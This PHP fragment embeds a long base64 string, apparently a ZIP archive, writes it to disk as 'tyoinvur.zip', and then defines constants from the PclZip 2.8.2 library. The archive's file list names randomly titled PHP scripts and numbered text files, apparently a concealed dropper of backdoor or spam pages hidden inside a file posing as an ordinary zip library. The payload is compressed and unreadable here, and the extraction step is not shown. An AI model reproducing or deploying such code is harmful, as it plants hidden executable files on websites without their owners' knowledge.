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"); 
file_put_contents("tyoinvur.zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
